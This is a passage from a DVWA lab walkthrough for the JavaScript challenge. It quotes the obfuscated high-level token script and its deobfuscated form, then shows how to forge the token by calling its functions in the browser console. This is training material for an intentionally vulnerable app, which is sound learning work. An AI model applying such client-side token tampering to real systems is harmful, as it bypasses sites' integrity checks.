So, after entering success in the input box, in the console, enter do_elsesomething("XX"). Note: My path here is http://xx.xx.xx.xx/dvwa/vulnerabilities/javascript/, And accessing the js file in the code as /vulnerabilities/javascript/source/medium.js will result in the inability to access the js file, so in my case, I need to change the source code by myself and add dvwa in the path

High
Server-side core code

<?php
$page[ 'body' ] .= <<<EOF
<script src="/vulnerabilities/javascript/source/high.js"></script>
EOF;
?>

Similar to advanced level and intermediate level, the logic of token generation is in an additional js file. The difference from intermediate level is that the JS here has been obfuscated...it looks very confusing.


var a=['fromCharCode','toString','replace','BeJ','\x5cw+','Lyg','SuR','(w(){\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\x202L=!1R&&1c\x202M===\x271n\x27;q\x202o=!Y.2S&&1c\x202d===\x271n\x27&&2d.2Q&&2d.2Q.3S;p(2o){Y=3R}z\x20p(2L){Y=2M}q\x202G=!Y.3Q&&1c\x202g===\x271n\x27&&2g.X;q\x202s=1c\x202l===\x27w\x27&&2l.3P;q\x201y=!Y.3H&&1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\x204C.Q.2U.1I(1x)===\x27[1n\x201z]\x27}}p(1y&&(Y.50||!Z.1N)){Z.1N=w(1x){A\x201c\x201x===\x271n\x27&&1x.1w&&1x.1w.1J===Z}}q\x202m=w(1X,x){A\x20w(s){A\x20O\x20N(x,1d).S(s)[1X]()}};q\x202a=w(x){q\x20P=2m(\x271e\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\x20O\x20N(x)};P.S=w(s){A\x20P.1T().S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2m(T,x)}A\x20P};q\x202P=w(P,x){q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s){p(1c\x20s===\x272p\x27){A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x27)}z{p(s===2q||s===2T){1u\x20O\x201t(1l)}z\x20p(s.1J===Z){s=O\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)}z{A\x20P(s)}};A\x202z};q\x202k=w(1X,x){A\x20w(G,s){A\x20O\x201P(G,x,1d).S(s)[1X]()}};q\x202f=w(x){q\x20P=2k(\x271e\x27,x);P.1T=w(G){A\x20O\x201P(G,x)};P.S=w(G,s){A\x20P.1T(G).S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2k(T,x)}A\x20P};w\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\x202h,T=1c\x20s;p(T!==\x272p\x27){p(T===\x271n\x27){p(s===2q){1u\x20O\x201t(1l)}z\x20p(1y&&s.1J===Z){s=O\x202r(s)}z\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}2h=1d}q\x20r,M=0,i,W=s.W,l=k.l;4t(M<W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M<W&&i<1k;++M){l[i>>2]|=s[M]<<U[i++&3]}}z{1g(i=k.1A;M<W&&i<1k;++M){r=s.1Q(M);p(r<R){l[i>>2]|=r<<U[i++&3]}z\x20p(r<2v){l[i>>2]|=(2t|(r>>6))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z\x20p(r<2A||r>=2E){l[i>>2]|=(2D|(r>>12))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z{r=2C+(((r&23)<<10)|(s.1Q(++M)&23));l[i>>2]|=(2X|(r>>18))<<U[i++&3];l[i>>2]|=(R|((r>>12)&V))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}}}k.2u=i;k.L+=i-k.1A;p(i>=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L>4r){k.2i+=k.L/2H<<0;k.L=k.L%2H}A\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\x20l=k.l,i=k.2u;l[16]=k.1C;l[i>>2]|=2w[i&3];k.1C=l[16];p(i>=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i<<3|k.L>>>29;l[15]=k.L<<3;k.1W()};N.Q.1W=w(){q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j<1k;++j){v=l[j-15];1a=((v>>>7)|(v<<25))^((v>>>18)|(v<<14))^(v>>>3);v=l[j-2];1b=((v>>>17)|(v<<15))^((v>>>19)|(v<<13))^(v>>>10);l[j]=l[j-16]+1a+l[j-7]+1b<<0}1D=b&c;1g(j=0;j<1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o<<0;d=v+4p<<0}z{1B=4v;v=l[0]-4w;h=v-4G<<0;d=v+4D<<0}k.2j=1O}z{1a=((a>>>2)|(a<<30))^((a>>>13)|(a<<19))^((a>>>22)|(a<<10));1b=((e>>>6)|(e<<26))^((e>>>11)|(e<<21))^((e>>>25)|(e<<7));1B=a&b;1j=1B^(a&c)^1D;1h=(e&f)^(~e&g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v<<0;d=v+1f<<0}1a=((d>>>2)|(d<<30))^((d>>>13)|(d<<19))^((d>>>22)|(d<<10));1b=((h>>>6)|(h<<26))^((h>>>11)|(h<<21))^((h>>>25)|(h<<7));1Z=d&a;1j=1Z^(d&b)^1B;1h=(h&e)^(~h&f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v<<0;c=v+1f<<0;1a=((c>>>2)|(c<<30))^((c>>>13)|(c<<19))^((c>>>22)|(c<<10));1b=((g>>>6)|(g<<26))^((g>>>11)|(g<<21))^((g>>>25)|(g<<7));1V=c&d;1j=1V^(c&a)^1Z;1h=(g&h)^(~g&e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v<<0;b=v+1f<<0;1a=((b>>>2)|(b<<30))^((b>>>13)|(b<<19))^((b>>>22)|(b<<10));1b=((f>>>6)|(f<<26))^((f>>>11)|(f<<21))^((f>>>25)|(f<<7));1D=b&c;1j=1D^(b&d)^1V;1h=(f&g)^(~f&h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v<<0;a=v+1f<<0}k.C=k.C+a<<0;k.B=k.B+b<<0;k.E=k.E+c<<0;k.F=k.F+d<<0;k.J=k.J+e<<0;k.I=k.I+f<<0;k.H=k.H+g<<0;k.D=k.D+h<<0};N.Q.1e=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C>>28)&o]+m[(C>>24)&o]+m[(C>>20)&o]+m[(C>>16)&o]+m[(C>>12)&o]+m[(C>>8)&o]+m[(C>>4)&o]+m[C&o]+m[(B>>28)&o]+m[(B>>24)&o]+m[(B>>20)&o]+m[(B>>16)&o]+m[(B>>12)&o]+m[(B>>8)&o]+m[(B>>4)&o]+m[B&o]+m[(E>>28)&o]+m[(E>>24)&o]+m[(E>>20)&o]+m[(E>>16)&o]+m[(E>>12)&o]+m[(E>>8)&o]+m[(E>>4)&o]+m[E&o]+m[(F>>28)&o]+m[(F>>24)&o]+m[(F>>20)&o]+m[(F>>16)&o]+m[(F>>12)&o]+m[(F>>8)&o]+m[(F>>4)&o]+m[F&o]+m[(J>>28)&o]+m[(J>>24)&o]+m[(J>>20)&o]+m[(J>>16)&o]+m[(J>>12)&o]+m[(J>>8)&o]+m[(J>>4)&o]+m[J&o]+m[(I>>28)&o]+m[(I>>24)&o]+m[(I>>20)&o]+m[(I>>16)&o]+m[(I>>12)&o]+m[(I>>8)&o]+m[(I>>4)&o]+m[I&o]+m[(H>>28)&o]+m[(H>>24)&o]+m[(H>>20)&o]+m[(H>>16)&o]+m[(H>>12)&o]+m[(H>>8)&o]+m[(H>>4)&o]+m[H&o];p(!k.x){1e+=m[(D>>28)&o]+m[(D>>24)&o]+m[(D>>20)&o]+m[(D>>16)&o]+m[(D>>12)&o]+m[(D>>8)&o]+m[(D>>4)&o]+m[D&o]}A\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C>>24)&u,(C>>16)&u,(C>>8)&u,C&u,(B>>24)&u,(B>>16)&u,(B>>8)&u,B&u,(E>>24)&u,(E>>16)&u,(E>>8)&u,E&u,(F>>24)&u,(F>>16)&u,(F>>8)&u,F&u,(J>>24)&u,(J>>16)&u,(J>>8)&u,J&u,(I>>24)&u,(I>>16)&u,(I>>8)&u,I&u,(H>>24)&u,(H>>16)&u,(H>>8)&u,H&u];p(!k.x){2b.4A((D>>24)&u,(D>>16)&u,(D>>8)&u,D&u)}A\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\x201w=O\x20Z(k.x?28:32);q\x201i=O\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\x201w};w\x201P(G,x,1v){q\x20i,T=1c\x20G;p(T===\x272p\x27){q\x20L=[],W=G.W,M=0,r;1g(i=0;i<W;++i){r=G.1Q(i);p(r<R){L[M++]=r}z\x20p(r<2v){L[M++]=(2t|(r>>6));L[M++]=(R|(r&V))}z\x20p(r<2A||r>=2E){L[M++]=(2D|(r>>12));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}z{r=2C+(((r&23)<<10)|(G.1Q(++i)&23));L[M++]=(2X|(r>>18));L[M++]=(R|((r>>12)&V));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}}G=L}z{p(T===\x271n\x27){p(G===2q){1u\x20O\x201t(1l)}z\x20p(1y&&G.1J===Z){G=O\x202r(G)}z\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}}p(G.W>1k){G=(O\x20N(x,1d)).S(G).27()}q\x201F=[],2e=[];1g(i=0;i<1k;++i){q\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\x20X})}}})();w\x202y(e){1g(q\x20t=\x22\x22,n=e.W-1;n>=0;n--)t+=e[n];A\x20t}w\x202J(t,y=\x224B\x22){1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)}w\x202B(e=\x224E\x22){1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)}w\x202K(a,b){1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)}1m.1o(\x222F\x22).1r=\x22\x22;4u(w(){2B(\x224M\x22)},4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);','||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW','split'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j<e?'':h(parseInt(j/e)))+((j=j%e)>0x23?String[b('0x0')](j+0x1d):j[b('0x1')](0x24));};if(!''[b('0x2')](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if('wpA'!==b('0x3')){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b('0x4');};f=0x1;}}];h=function(){return b('0x4');};f=0x1;};while(f--){if(g[f]){if(b('0x5')===b('0x6')){return i[h];}else{d=d[b('0x2')](new RegExp('\x5cb'+h(f)+'\x5cb','g'),g[f]);}}}return d;}(b('0x7'),0x3e,0x137,b('0x8')[b('0x9')]('|'),0x0,{}));

The function provided by http://deobfuscatejavascript.com is to convert the obfuscated code into some js code that humans can understand, and the key part is here:



function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
function token_part_3(t, y = "ZZ") {
    document.getElementById("token").value = sha256(document.getElementById("token").value + y)
}
function token_part_2(e = "YY") {
    document.getElementById("token").value = sha256(e + document.getElementById("token").value)
}
function token_part_1(a, b) {
    document.getElementById("token").value = do_something(document.getElementById("phrase").value)
}
document.getElementById("phrase").value = "";
setTimeout(function() {
    token_part_2("XX")
}, 300);
document.getElementById("send").addEventListener("click", token_part_3);
token_part_1("ABCD", 44);


The steps to generate token here are

Execute token_part_1("ABCD", 44)
Execute token_part_2("XX") (the one that was originally executed with a delay of 300ms)
Execute token_part_3 when the button is clicked
So we enter success in the input box, and then enter the two functions token_part_1("ABCD", 44) and token_part_2("XX") in the console.

Note: As above, you need to change the source code yourself, and add dvwa in the path

Impossible
Server-side core code

You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.
You should never trust anything from the user or prevent them from messing with it, so there is no level of impossibility.

Summarize

Once the tool is used, once the exp is connected, the shell will be available. Anyone can learn this, but in the process of digging holes, the basic things are very important. I think the real value of the dvwa target machine is to introduce newcomers to the web. We have some contacts in all aspects, so that we have a start and a contact, and then we will have a direction.


